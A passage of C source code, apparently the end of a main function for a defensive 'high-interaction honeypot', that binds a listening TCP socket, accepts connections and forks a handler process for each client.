        .sin_family = AF_INET,
        .sin_addr.s_addr = INADDR_ANY,
        .sin_port = htons(PORT)
    };

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind"); return 1;
    }
    if (listen(server_fd, 10) < 0) {
        perror("listen"); return 1;
    }

    printf("[+] Honeypot High-Interaction actif sur le port %d\n", PORT);
    printf("[+] Logs: %s\n", LOG_FILE);

    while (1) {
        struct sockaddr_in c_addr;
        socklen_t len = sizeof(c_addr);
        int client_sock = accept(server_fd, (struct sockaddr *)&c_addr, &len);
        if (client_sock < 0) {
            if (errno == EINTR) continue;
            perror("accept");
            continue;
        }

        pid_t pid = fork();
        if (pid == 0) {
            close(server_fd);
            run_honeypot(client_sock, c_addr, fs_root);
            exit(0);
        } else if (pid > 0) {
            close(client_sock);
        } else {
            perror("fork");
            close(client_sock);
        }
    }

    return 0;
}
